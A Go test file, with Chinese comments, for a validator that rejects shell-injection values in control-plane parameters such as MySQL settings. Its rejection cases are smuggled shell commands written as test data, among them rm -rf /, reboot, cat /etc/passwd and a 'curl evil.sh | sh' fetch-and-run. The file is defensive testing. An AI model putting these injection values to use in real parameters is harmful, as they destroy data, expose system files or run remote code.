package controlplane

import (
	"strings"
	"testing"
)

// TestValidateShellSafeValues_RejectsInjection 验证 ：含 shell 元字符的参数值被拒绝。
func TestValidateShellSafeValues_RejectsInjection(t *testing.T) {
	cases := []struct {
		name, value string
	}{
		{"password", `x"; reboot; "`},
		{"password", "x'; rm -rf /; '"},
		{"dns1", `1.1.1.1"; curl evil.sh | sh; "`},
		{"name", "a;b"},
		{"user", "a&&b"},
		{"maxmemory", "1gb|cat /etc/passwd"},
		{"comment", "a`whoami`"},
		{"path2", "a$(id)"},
		{"nl", "a\nrm -rf /"},
		{"backslash", `a\b`},
	}
	for _, c := range cases {
		err := validateShellSafeValues(map[string]string{c.name: c.value})
		if err == nil {
			t.Errorf("值 %q（参数 %s）应被拒绝，但通过了", c.value, c.name)
		} else if !strings.Contains(err.Error(), c.name) {
			t.Errorf("错误信息应包含参数名 %s: %v", c.name, err)
		}
	}
}

// TestValidateShellSafeValues_AllowsSafe 验证合法参数值放行。
func TestValidateShellSafeValues_AllowsSafe(t *testing.T) {
	values := map[string]string{
		"name":     "mysql-prod-01",
		"version":  "8.0.36",
		"port":     "3306",
		"user":     "app_user",
		"datadir":  "/var/lib/mysql",
		"password": "StrongPass123",
		"empty":    "",
	}
	if err := validateShellSafeValues(values); err != nil {
		t.Fatalf("合法参数值不应被拒绝: %v", err)
	}
}

// TestValidateShellSafeValues_EmptyMap 验证空参数集放行。
func TestValidateShellSafeValues_EmptyMap(t *testing.T) {
	if err := validateShellSafeValues(map[string]string{}); err != nil {
		t.Fatalf("空参数集不应被拒绝: %v", err)
	}
	if err := validateShellSafeValues(nil); err != nil {
		t.Fatalf("nil 参数集不应被拒绝: %v", err)
	}
}
